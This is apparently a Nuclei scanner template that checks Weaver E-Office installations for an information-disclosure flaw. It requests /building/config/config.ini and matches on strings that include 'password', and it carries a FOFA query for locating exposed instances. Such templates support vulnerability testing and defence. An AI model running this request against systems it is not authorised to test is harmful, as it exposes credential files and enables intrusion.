id: weaver_e_office_building_fileread

info:
  name: weaver_e_office_building_fileread
  author: Xc1Ym
  severity: medium
  description: eoffice /building/config/ 信息泄露
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="泛微-EOffice"
  tags: fileread,OA,hw,weaver

http:
    - method: GET
      path: 
        - "{{RootURL}}/building/config/config.ini"
      
      matchers:
        - type: word
          words:
            - "[building]"
            - "[im]"
            - "password"
          condition: and
